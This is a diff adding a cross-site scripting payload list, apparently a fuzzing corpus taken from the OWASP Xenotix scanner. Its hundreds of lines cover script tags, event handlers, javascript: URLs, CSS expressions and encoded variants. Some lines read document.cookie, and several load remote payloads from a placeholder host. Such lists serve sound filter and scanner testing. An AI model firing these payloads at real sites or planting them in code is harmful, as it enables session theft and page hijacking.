@@ -1,0 +1,1204 @@
+#
+# Original source is from 
+# https://github.com/ajinabraham/OWASP-Xenotix-XSS-Exploit-Framework/blob/master/Scanner/xenotix_main.resx
+#
+# * XML-decoded
+# * Duplicates removed
+# * arious forms of control-characters normalized
+# * Non-XSS removed
+# * Obsolete XSS removed (e.g. one for src=livescript lol circa 1995)
+#
+
+%00<body onload=alert(1)>
+&#00;</form><input type&#61;"date" onfocus="alert(1)">
+
+# not doing XSS inside a comment
+# --><!-- --%00> <img src=xxx:x onerror=javascript:alert(1)> -->
+"'`><%00img src=xxx:x onerror=javascript:alert(1)>
+%00“><script>alert(1)</script>
+'`"><%00script>javascript:alert(1)</script>
+0?<script>Worker("#").onmessage=function(_)eval(_.data)</script> :postMessage(importScripts('data:;base64,cG9zdE1lc3NhZ2UoJ2FsZXJ0KDEpJyk'))
+&#13;<blink/&#13; onmouseover=pr&#x6F;mp&#116;(1)>OnMouseOver {Firefox & Opera}
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+1<a href=#><line xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute href=javascript:javascript:alert(1) strokecolor=white strokeweight=1000px from=0 to=1000 /></a>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=<img/src=&quot;.&quot;onerror=alert(1)>>
+1<animate/xmlns=urn:schemas-microsoft-com:time style=behavior:url(#default#time2) attributename=innerhtml values=<img/src=&quot;.&quot;onerror=javascript:alert(1)>>
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`<img/src=&quot;x&quot;onerror=alert(1)>`>
+1<set/xmlns=`urn:schemas-microsoft-com:time` style=`beh&#x41vior:url(#default#time2)` attributename=`innerhtml` to=`<img/src=&quot;x&quot;onerror=javascript:alert(1)>`>
+1<vmlframe xmlns=urn:schemas-microsoft-com:vml style=behavior:url(#default#vml);position:absolute;width:100%25;height:100%25 src=test.vml#kcf></vmlframe>
+'%20onmouseover=alert(1)'
+--><!-- --%21> <img src=xxx:x onerror=javascript:alert(1)> -->
+%22%20onmouseover=javascript:alert(1)%20%22
+%22%3E%3C%73%63%72%69%70%74%3E%4B%43%46%3C%2F%73%63%72%69%70%74%3E
+%22/%3E%3Cmeta%20http-equiv=refresh%20content=0;javascript:alert(1);>
+%22%3E%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
+%26'%22%3E%3Cscript%3Ealert(%2Fkcf%2F)%3C%2Fscript%3E%3D
+%27%3E%3C%73%63%72%69%70%74%3E%4B%43%46%3C%2F%73%63%72%69%70%74%3E
+&#34;&#62;<h1/onmouseover='%0061lert(1)'>%00
+&#34;&#62;<svg><style>{-o-link-source&colon;'<body/onload=confirm(1)>'
+%3Cform%20name%3D%22body%22%20onmouseover%3D%22alert(1)%22%20style%3D%22height%3A800px%22%3E%3Cfieldset%20name%3D%22attributes%22%3E%3Cform%3E%3C%2Fform%3E%3Cform%20name%3D%22parentNode%22%3E%3Cimg%20id%3D%22attributes%22%3E%3C%2Fform%3E%3C%2Ffieldset%3E%3C%2Fform%3E
+%3Cform%20onmouseover%3Dalert(1)%3E%3Cinput%20name%3Dattributes%3E
+%3Cimg%20name%3DgetElementsByTagName%20src%3D1%20%20onerror%3Dalert(1)%3E
+%3cimg onerror=alert(1) src=a%3e
+"'`><%3Cimg src=xxx:x onerror=javascript:alert(1)>
+%3Cscript%3Ea%3D%2FKCF%2F
+%3Cscript%3Ealert(1)%3B%3C%2Fscript%3E
+'`"><%3Cscript>javascript:alert(1)</script>
+%3Cscript>javascript:alert(1)</script>
+“%3e%3cscript%3ealert(1)%3c/script%3e
+--><!-- --%3E> <img src=xxx:x onerror=javascript:alert(1)> -->
+%7D%3C/style%3E43%27%22%3E%3C/title%3E%3Cscript%3Ea=eval;b=alert;a(b(/KCF/.source));%3C/script%3E%27%22%3E%3Cmarquee%3E%3Ch1%3EKCF%3C/h1%3E%3C/marquee%3E
+<a&#32;href&#61;&#91;&#00;&#93;"&#00; onmouseover=prompt&#40;1&#41;&#47;&#47;">XYZ</a
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa  aaaaaaaaa aaaaaaaaaa  href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe
+<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>KCF
+"'`>ABC<div style="font-family:'foo'%3Bx:expression(javascript:alert(1);/*';">DEF
+"'`>ABC<div style="font-family:'foo'%7Dx:expression(javascript:alert(1);/*';">DEF
+ABC<div style="x:%00expression(javascript:alert(1)">DEF
+ABC<div style="x:%09expression(javascript:alert(1)">DEF
+ABC<div style="x:%0Aexpression(javascript:alert(1)">DEF
+ABC<div style="x:%0Bexpression(javascript:alert(1)">DEF
+ABC<div style="x:%0Cexpression(javascript:alert(1)">DEF
+ABC<div style="x:%0Dexpression(javascript:alert(1)">DEF
+ABC<div style="x:%20expression(javascript:alert(1)">DEF
+ABC<div style="x%3Aexpression(javascript:alert(1)">DEF
+ABC<div style="x:%C2%A0expression(javascript:alert(1)">DEF
+ABC<div style="x:%E2%80%80expression(javascript:alert(1)">DEF
+ABC<div style="x:%E2%80%81expression(javascript:alert(1)">DEF
+ABC<div style="x:%E2%80%82expression(javascript:alert(1)">DEF
+ABC<div style="x:%E2%80%83expression(javascript:alert(1)">DEF
+ABC<div style="x:%E2%80%84expression(javascript:alert(1)">DEF
+ABC<div style="x:%E2%80%85expression(javascript:alert(1)">DEF
+ABC<div style="x:%E2%80%86expression(javascript:alert(1)">DEF
+ABC<div style="x:%E2%80%87expression(javascript:alert(1)">DEF
+ABC<div style="x:%E2%80%88expression(javascript:alert(1)">DEF
+ABC<div style="x:%E2%80%89expression(javascript:alert(1)">DEF
+ABC<div style="x:%E2%80%8Aexpression(javascript:alert(1)">DEF
+ABC<div style="x:%E2%80%8Bexpression(javascript:alert(1)">DEF
+ABC<div style="x:%E3%80%80expression(javascript:alert(1)">DEF
+ABC<div style="x:%EF%BB%BFexpression(javascript:alert(1)">DEF
+ABC<div style="x:exp%00ression(javascript:alert(1)">DEF
+ABC<div style="x:exp%5Cression(javascript:alert(1)">DEF
+ABC<div style="x:expression%00(javascript:alert(1)">DEF
+ABC<div style="x:expression%5C(javascript:alert(1)">DEF
+<!a foo=x=`y><img alt="`><img src=x:x onerror=alert(2)//">
+<?a foo=x=`y><img alt="`><img src=x:x onerror=alert(3)//">
+<a href="%00javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%01javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%02javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%03javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%04javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%05javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%06javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%07javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%08javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%09javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%0Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%0Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%0Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%0Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%0Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%0Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%10javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%11javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="123" id=x>kcf</a><script>x='javascript:alert(1)'//only in compat!;</script>
+<a href="123" id=x>test</a><script>x='javascript:alert(1)';</script>
+<a href="%12javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%13javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%14javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%15javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%16javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%17javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%18javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%19javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%1Ajavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%1Bjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%1Cjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%1Djavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%1Ejavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="%1Fjavascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href=1 name=x>kcf</a><a href=1 name=x>kcf</a><script>alert(x.removeChild)//undefinedalert(x.parentNode)//undefined</script>
+<a href=1 name=x>test</a><a href=1 name=x>test</a><script>alert(x.removeChild)alert(x.parentNode)</script>
+<a href="%20javascript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="data:application/x-x509-user-cert;&NewLine;base64&NewLine;,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4="&#09;&#10;&#11;>X</a
+<a href="data:text/html;base64_,<svg/onload=%0061&#x6C;&#101%72t(1)>">X</a
+<a href="data:text/html;blabla,&#60&#115&#99&#114&#105&#112&#116&#32&#115&#114&#99&#61&#34&#104&#116&#116&#112&#58&#47&#47&#115&#116&#101&#114&#110&#101&#102&#97&#109&#105&#108&#121&#46&#110&#101&#116&#47&#102&#111&#111&#46&#106&#115&#34&#62&#60&#47&#115&#99&#114&#105&#112&#116&#62&#8203">KCF</a>
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=alert(1)></a>">
+<a href=http://foo.bar/#x=`y></a><img alt="`><img src=x:x onerror=javascript:alert(1)></a>">
+<a href="invalid:1" id=x name=y>kcf</a><a href="invalid:2" id=x name=y>kcf</a><script>alert(x.y[0])</script>
+<a href="invalid:1" id=x name=y>test</a><a href="invalid:2" id=x name=y>test</a><script>alert(x.y[0])</script>
+<a href="jav&#65ascript:javascript:alert(1)">test1</a>
+<a href="jav&#97ascript:javascript:alert(1)">test1</a>
+<a href=java&#1&#2&#3&#4&#5&#6&#7&#8&#11&#12script:javascript:alert(1)>KCF</a>
+<a href="javas%00cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas%01cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas%02cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas%03cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas%04cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas%05cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas%06cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas%07cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas%08cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas%09cript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas%0Acript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas%0Bcript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas%0Ccript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javas%0Dcript:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript:%0031+%0031%005b'\145\166\141\154'%005d%0028'\141\154\145\162\164\50\61\51'%0029">kcf</a>
+<a href="javascript%00:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript%09:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript%0A:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript%0D:javascript:alert(1)" id="fuzzelement1">test</a>
+<a/href="javascript:&#13; javascript:prompt(1)"><input type="X">
+<a href="javascript%3A:javascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript%3Ajavascript:alert(1)" id="fuzzelement1">test</a>
+<a href="javascript#alert(1);">
+<a href="javascript:alert(1)">kcf</a>
+<a href="javascript&colon;%0061&#x6C;&#101%72t&lpar;1&rpar;"><button>
+<a href="jAvAsCrIpT&colon;alert&lpar;1&rpar;">X</a>
+<a href=javascript&colon;alert&lpar;document&period;cookie&rpar;>KCF</a>
+<A HREF="javascript:document.location='http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html'">KCF</A>
+<a href="javascript:javascript:alert(1)"><event-source src="data:application/x-dom-event-stream,Event:click%0Adata:KCF%0A%0A">
+<a href="javascript:void(0)" onmouseover=&NewLine;javascript:alert(1)&NewLine;>X</a>
+<a href="&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x5C&#x75&#x30&#x30&#x33&#x31&#x2B&#x5C&#x75&#x30&#x30&#x33&#x31&#x5C&#x75&#x30&#x30&#x35&#x62&#x27&#x5C&#x31&#x34&#x35&#x5C&#x31&#x36&#x36&#x5C&#x31&#x34&#x31&#x5C&#x31&#x35&#x34&#x27&#x5C&#x75&#x30&#x30&#x35&#x64&#x5C&#x75&#x30&#x30&#x32&#x38&#x27&#x5C&#x31&#x34&#x31&#x5C&#x31&#x35&#x34&#x5C&#x31&#x34&#x35&#x5C&#x31&#x36&#x32&#x5C&#x31&#x36&#x34&#x5C&#x35&#x30&#x5C&#x36&#x31&#x5C&#x35&#x31&#x27&#x5C&#x75&#x30&#x30&#x32&#x39">kcf</a>
+<a href=x onerror=alert(1)>
+';alert(String.fromCharCode(75,67,70))//\';alert(String.fromCharCode(75,67,70))//";alert(String.fromCharCode(75,67,70))//\";alert(String.fromCharCode(75,67,70))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>=&{}
+alert(String.fromCharCode(75,67,70))//";alert(String.fromCharCode(75,67,70))//--></SCRIPT>">'><SCRIPT>alert(String.fromCharCode(75,67,70))</SCRIPT>
+</a onmousemove="alert(1)">
+</a onmousemove=alert(1)>
+<a onmouseover=(alert(1))>KCF</a>
+<a onmouseover="alert(document.cookie)">kcf link</a>
+<a onmouseover=alert(document.cookie)>kcf link</a>
+<applet onerror applet onerror="javascript:javascript:alert(1)"></applet onerror>
+<applet onError applet onError="javascript:javascript:alert(1)"></applet onError>
+<applet onreadystatechange applet onreadystatechange="javascript:javascript:alert(1)"></applet onreadystatechange>
+<applet onReadyStateChange applet onReadyStateChange="javascript:javascript:alert(1)"></applet onReadyStateChange>
+<article xmlns="><img src=x onerror=alert(1)"></article>
+<article xmlns="x:img src=x onerror=alert(1) ">
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:alert(1)">XXX</a>
+<a style="behavior:url(#default#AnchorClick);" folder="javascript:javascript:alert(1)">KCF</a>
+<a style="-o-link:'javascript:alert(1)';-o-link-source:current">X</a>
+<a style="-o-link:'javascript:javascript:alert(1)';-o-link-source:current">X
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="alert(1);">XXX</a></a><a href="javascript:alert(2)">XXX</a>
+<a style="pointer-events:none;position:absolute;"><a style="position:absolute;" onclick="javascript:alert(1);">KCF</a></a><a href="javascript:javascript:alert(1)">KCF</a><style>*[{}@import'%25(css)s?]</style>X
+<audio src=1 href=1 onerror="javascript:alert(1)"></audio>
+<audio src=1 onerror=alert(1)>
+<b/alt="1"onmouseover=InputBox+1language=vbs>KCF</b>
+<BASE HREF="javascript:alert(1);//">
+<BASE HREF="javascript:alert('KCF');//">
+<BASE HREF="javascript:javascript:alert(1);//">
+<bgsound onpropertychange=alert(1)>
+<bgsound onPropertyChange bgsound onPropertyChange="javascript:javascript:alert(1)"></bgsound onPropertyChange>
+<BGSOUND SRC="javascript:alert(1);">
+<BGSOUND SRC="javascript:alert('KCF');">
+<BGSOUND SRC="javascript:javascript:alert(1);">
+<b id="id1" x=begin0x2924end >`'"></b><script>if (!/begin.end/.test(document.getElementById('id1').getAttribute('x'))) { alert(1);}</script>
+<b id="id1" x=begin0x9fa0end >`'"></b><script>if (!/begin.end/.test(document.getElementById('id1').getAttribute('x'))) { alert(1);}</script>
+<BODY BACKGROUND="javascript:alert(1)">
+<BODY BACKGROUND="javascript:alert('KCF')">
+<body> §iframe onload=confirm(/kcf/)> <img src=x:x onerror="innerHTML=previousSibling.nodeValue.replace('§','<')"> </body>
+<body onactivate=alert(1)>
+<body onbeforeactivate=alert(1)>
+<body onbeforeunload body onbeforeunload="javascript:javascript:alert(1)"></body onbeforeunload>
+<body onBeforeUnload body onBeforeUnload="javascript:javascript:alert(1)"></body onBeforeUnload>
+<body onblur body onblur="javascript:javascript:alert(1)"></body onblur>
+<body onfocus body onfocus="javascript:javascript:alert(1)"></body onfocus>
+<body onFocus body onFocus="javascript:javascript:alert(1)"></body onFocus>
+<body onfocusin=alert(1)>
+<body oninput=alert(1)><input autofocus>
+<body oninput=javascript:alert(1)><input autofocus>
+<body oninput=prompt(1)><input autofocus>
+<body onkeydown body onkeydown="javascript:javascript:alert(1)"></body onkeydown>
+<body onkeyup body onkeyup="javascript:javascript:alert(1)"></body onkeyup>
+\"><body onload=\"1\">
+\\\'><body onload=\\\'1\\\'>
+<body/onload=<!-->&#10alert(1)>
+<body onload="alert(1);">
+<body onload="alert(1)">
+<BODY ONLOAD=alert(1)>
+<BODY ONLOAD=alert('KCF')>
+<body onload body onload="javascript:javascript:alert(1)"></body onload>
+<body onLoad body onLoad="javascript:javascript:alert(1)"></body onLoad>
+<BODY ONLOAD=javascript:alert(1)>
+<BODY ONLOAD=javascript:javascript:alert(1)>
+"><body onload="KCF">
+\'><body onload=\'KCF\'>
+<body onMouseEnter body onMouseEnter="javascript:javascript:alert(1)"></body onMouseEnter>
+<body onMouseMove body onMouseMove="javascript:javascript:alert(1)"></body onMouseMove>
+<body onMouseOver body onMouseOver="javascript:javascript:alert(1)"></body onMouseOver>
+<body onpagehide body onpagehide="javascript:javascript:alert(1)"></body onpagehide>
+<body onPageHide body onPageHide="javascript:javascript:alert(1)"></body onPageHide>
+<body onPageShow body onPageShow="javascript:javascript:alert(1)"></body onPageShow>
+<body onPopState body onPopState="javascript:javascript:alert(1)"></body onPopState>
+<body onPropertyChange body onPropertyChange="javascript:javascript:alert(1)"></body onPropertyChange>
+<body onResize body onResize="javascript:javascript:alert(1)"></body onResize>
+<body onscroll=alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<body onscroll=alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onscroll=alert(1)><br><br>...<br><input autofocus>
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onscroll=javascript:alert(1)><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><br><input autofocus>
+<body onscroll=prompt(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+<body onunload body onunload="javascript:javascript:alert(1)"></body onunload>
+<body onUnload body onUnload="javascript:javascript:alert(1)"></body onUnload>
+<body src=1 href=1 onerror="javascript:alert(1)"></body>
+<button/onclick=alert(1) >KCF</button>
+<comment><img src="</comment><img src=x onerror=alert(1)//">
+<comment><img src="</comment><img src=x onerror=alert(1))//">
+<comment><img src="</comment><img src=x onerror=javascript:alert(1))//">
+<comment><img src="</comment><img src=x onerror=prompt(1)//">
+</C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
+[data "1<div style=width:expression(prompt(1))>"]
+data:text/html,%3Cscript%3Ealert(1)%3C%2Fscript%3E
+data:text/html,%3Cscript%3Ealert(1)%3C/script%3E
+data:text/html,<script>alert(1)</script>
+<div class="foo1">kcf</div> <script>document.getElementsByClassName('foo1')[0]?alert(1):0</script>
+<div datafld="b" dataformatas="html" datasrc="#X"></div>
+<div id="alert('/kcf/')" style="x:expression(eval)(id)">
+<div id=d><div style="font-family:'sans\27\2F\2A\22\2A\2F\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
+<div id=d><div style="font-family:'sans\27\3B color\3Ared\3B'">X</div></div> <script>with(document.getElementById("d"))innerHTML=innerHTML</script>
+<div id="div1"><input value="``onmouseover=alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<div id="div1"><input value="``onmouseover=javascript:alert(1)"></div> <div id="div2"></div><script>document.getElementById("div2").innerHTML = document.getElementById("div1").innerHTML;</script>
+<div id=d><x xmlns="><iframe onload=alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
+<div id=d><x xmlns="><iframe onload=javascript:alert(1)"></div> <script>d.innerHTML=d.innerHTML</script>
+<div id="x">KCF</div> <style>  #x{font-family:foo[bar;color:green;}  #y];color:red;{}  </style>
+<div id="x">x</div> <xml:namespace prefix="t"> <import namespace="t" implementation="#default#time2"> <t:set attributeName="innerHTML" targetElement="x" to="<img&#11;src=x:x&#11;onerror&#11;=javascript:alert(1)>">
+<div onmouseover="alert(1);">
+<div/onmouseover='alert(1)'> style="x:">
+<div onmouseover='alert&lpar;1&rpar;'>DIV</div>
+<div style="\63&#9\06f&#10\0006c&#12\00006F&#13\R:\000072 Ed;color\0\bla:yellow\0\bla;col\0\00 \&#xA0or:blue;">XXX</div>
+<div style="[a]color[b]:[c]red">XXX</div>
+<DIV STYLE="background-image:\0075\0072\006C\0028'\006a\0061\0076\0061\0073\0063\0072\0069\0070\0074\003a\0061\006c\0065\0072\0074\0028.1027\0058.1053\0053\0027\0029'\0029">
+<DIV STYLE="background-image: url(&#1;javascript:alert(1))">
+<DIV STYLE="background-image: url(&#1;javascript:alert('KCF'))">
+<div style="background-image: url(javascript:alert(1););">
+<DIV STYLE="background-image: url(javascript:alert(1))">
+<DIV STYLE="background-image: url(javascript:alert('KCF'))">
+<DIV STYLE="background-image: url(javascript:javascript:alert(1))">
+<div style="background:url(/f#&#127;oo/;color:red/*/foo.jpg);">X
+<div style="background:url(/f#[a]oo/;color:red/*/foo.jpg);">X</div>
+<div style="background:url(http://foo.f/f oo/;color:red/*/foo.jpg);">X</div>
+<div style="behaviour: url('http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html');">
+<div style="behaviour: url(http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html);">
+<div style="binding: url("http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html"));">
+<div style="binding: url(http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html));">
+<div style="color:red'{} x:expression(alert(1))">.</div>
+<div style=content:url(data:image/svg+xml,%3Csvg/%3E);visibility:hidden onload=alert(1)></div>
+<div style=content:url(%25(svg)s)></div>
+<div style="font-family:'foo&#10;;color:red;';">KCF
+<div style="font-family:'foo[a];color:red;';">XXX</div>
+<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X
+<div style="font-family:foo{bar;background:url(http://foo.f/oo};color:red/*/foo.jpg);">X</div>
+<div style="font-family:foo}color=red;">KCF
+<div style="font-family:foo}color=red;">XXX</div>
+<div style="kcf:expression(alert(1))'"></div>
+<div style="kcf:expression(alert(1))"></div>
+<div style="kcf:expression(alert(1))\"></div>
+<div style="kcf:expression(alert(1))">kcf/div>
+<div style="list-style:url(http://foo.f)\20url(javascript:alert(1));">X</div>
+<div style="list-style:url(http://foo.f)\20url(javascript:javascript:alert(1));">X
+<div  style="position:absolute;top:0;left:0;width:100%25;height:100%25"  onmouseover="prompt(1)" onclick="alert(1)">x</button>​
+<div style="position:absolute;top:0;left:0;width:100%25;height:100%25" onmouseover="prompt(1)" onclick="alert(1)">x</button>
+<div style=width:1px;filter:glow onfilterchange=alert(1)>x</div>
+<div style=width:1px;filter:glow onfilterchange=javascript:alert(1)>x
+<div style=width:1px;filter:glow onfilterchange=prompt(1)>x</div>
+<div style="width: expression(alert(1););">
+<DIV STYLE="width: expression(alert(1));">
+<DIV STYLE="width: expression(alert('KCF'));">
+<div/style="width:expression(confirm(1))">X</div> {IE7}
+<DIV STYLE="width:expression(javascript:alert(1));">
+<!DOCTYPE x[<!ENTITY x SYSTEM "http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.html">]><y>&x;</y>
+%E0<body onload=alert(1)>
+<embed code="http://XXXxenotixXXX:3555/xss_serve_payloads/flash.swf" allowscriptaccess=always>​
+<embed code="http://XXXxenotixXXX:3555/xss_serve_payloads/kcf.swf" allowscriptaccess=always>
+<embed code=javascript:javascript:alert(1);></embed>
+<embed code=%25(scriptlet)s></embed>
+<EMBED SRC="data:image/svg+xml;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4=" type="image/svg+xml" AllowScriptAccess="always"></EMBED>
+<embed src="data:text/html;base64,%25(base64)s">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgiS0NGIik8L3NjcmlwdD4="></embed>
+<EMBED SRC="http://XXXxenotixXXX:3555/xss_serve_payloads/flash.swf"></EMBED>
+<embed src="javascript:alert(1)">
+<embed src=javascript:alert(1)>
+<embed src=%25(jscript)s></embed>
+<embed type="image" src=%25(scriptlet)s></embed>
+<embed width=500 height=500 code="data:text/html,<script>%25(payload)s</script>"></embed>
+<!ENTITY x "&#x3C;html:img&#x20;src='x'&#x20;xmlns:html='http://www.w3.org/1999/xhtml'&#x20;onerror='alert(1)'/&#x3E;">
+<event-source src="%25(event)s" onload="javascript:alert(1)">
+<event-source src=javascript:alert(1)>
+exp/*<A STYLE='no\KCF:noKCF("*//*");
+exp/*<A STYLE='no\kcf:nokcf("*//*");kcf:&#101;x&#x2F;*KCF*//*/*/pression(alert(1))'>
+exp/*<A STYLE='no\kcf:nokcf("*//*");kcf:ex/*KCF*//*/*/pression(alert("KCF"))'>
+exp/*<A STYLE='no\KCF:noKCF("*//*");KCF:ex/*KCF*//*/*/pression(alert("KCF"))'>
+feed:data:text/html,%3cscript%3ealert%281%29%3c/script%3e
+feed:data:text/html,%3csvg%20onload=alert%281%29%3e
+</font>/<svg><style>{src&#x3A;'<style/onload=this.onload=confirm(1)>'</font>/</style>
+foo%00<script>alert(1)</script>
+<! foo="><script>alert(1)</script>">
+<? foo="><script>alert(1)</script>">
+</ foo="><script>alert(1)</script>">
+<! foo="><script>javascript:alert(1)</script>">
+<? foo="><script>javascript:alert(1)</script>">
+</ foo="><script>javascript:alert(1)</script>">
+<? foo="><x foo='?><script>alert(1)</script>'>">
+<%25 foo><x foo="%25><script>alert(1)</script>">
+<? foo="><x foo='?><script>javascript:alert(1)</script>'>">
+<%25 foo><x foo="%25><script>javascript:alert(1)</script>">
+//<form/action=javascript&#x3A;alert&lpar;document&period;cookie&rpar;><input/type='submit'>//
+<form><a href="javascript:%0061lert&#x28;1&#x29;">X
+<form><button formaction="javascript:alert(1)">X</button>
+<form><button formaction=javascript&colon;alert(1)>CLICKME
+<form><button formaction=javascript&colon;alert(1)>KCF
+<form><button formaction="javascript:javascript:alert(1)">X
+<form id=test /><button form=test formaction=javascript:alert(1)>
+<form id="test" /><button form="test" formaction="javascript:alert(1)">X
+<form id="test" /><button form="test" formaction="javascript:javascript:alert(1)">X
+<form id="test"></form><button form="test" formaction="javascript:alert(1)">X</button>
+<form id=test onforminput=javascript:alert(1)><input></form><button form=test onformchange=javascript:alert(1)>X
+<form id=test onforminput=prompt(1)><input></form><button form=test onformchange=prompt(2)>X</button>
+<form><iframe &#09;&#10;&#11; src="javascript&#58;alert(1)"&#11;&#10;&#09;;>
+<form><isindex formaction="javascript&colon;confirm(1)"
+<form name=self location="javascript&#58;alert(1)"></form><script>if(top!=self){ top.location=self.location}</script>
+<form name=self location="javascript&#58;alert(1)"></form><script>if(top!=self){top.location=self.location}</script>
+<form name=self location="javascript:alert(1)"></form><script>if(top!=self){ top.location=self.location}</script>
+<form name=self location="javascript:alert(1)"></form><script>if(top!=self){top.location=self.location}</script>
+<form><textarea &#13; onkeyup='%0061%006C%0065%0072%0074&#x28;1&#x29;'>
+<FRAMESET><FRAME SRC="javascript:alert(1);"></FRAMESET>
+<FRAMESET><FRAME SRC="javascript:alert('KCF');"></FRAMESET>
+<FRAMESET><FRAME SRC="javascript:javascript:alert(1);"></FRAMESET>
+<frameset onBlur frameset onBlur="javascript:javascript:alert(1)"></frameset onBlur>
+<frameset onFocus frameset onFocus="javascript:javascript:alert(1)"></frameset onFocus>
+<frameset onload=alert(1)>
+<frameset onload=javascript:alert(1)>
+<frameset onload=javascript:javascript:alert(1)></frameset>
+<frameset onload=prompt(1)>
+<frameset onScroll frameset onScroll="javascript:javascript:alert(1)"></frameset onScroll>
+?#?gad=xxxx"onload="alert(1)"
+/#?gad=xxxx"onload="alert(1)"
+#?gad=xxxx"onload="alert(1)"
+<head><base href="javascript://"/></head><body><a href="/. /,alert(1)//#">XXX</a></body>
+<head><base href="javascript://"></head><body><a href="/. /,javascript:alert(1)//#">KCF</a></body>
